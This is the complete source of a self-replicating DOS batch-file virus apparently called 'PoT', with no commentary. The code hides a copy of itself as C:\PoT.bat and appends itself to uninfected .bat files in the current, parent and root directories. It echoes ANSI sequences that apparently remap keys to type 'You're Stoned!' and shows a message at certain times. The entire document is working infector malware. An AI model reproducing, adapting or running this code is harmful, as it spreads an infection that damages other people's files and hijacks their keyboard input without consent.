@echo off%_PoT%
if '%PoT%=='I goto PoTz
if '%1=='_ goto PoTi
if exist C:\PoT.bat goto PoT
if not exist %0.bat goto PoTz
find "PoT"<%0.bat>C:\PoT.bat
attrib C:\PoT.bat +h
:PoT Makes You Feel Goodz
for %%f in (*.bat ..\*.bat C:\*.bat) do call C:\PoT.bat _ %%f
if '%PoT%=='I goto PoTf
set PoT=
echo %PoT%[32;"You're Stoned!       "p
echo %PoT%[96;"C:\PoT";13p%PoT%[2A
echo.%_PoT%|time|find "00">nul
if errorlevel 1 goto PoTf
echo %PoT%[1A%PoT%[s%PoT%[1;37;44m
echo %PoT%[3;9H Let me outta here! %PoT%[0m%PoT%[u
:PoTf gold
set PoT=
goto PoTz
:PoTi nfect
find /i "PoT"<%2>nul
if not errorlevel 1 goto PoTz
type C:\PoT.bat>>%2
set PoT=I
:PoTz
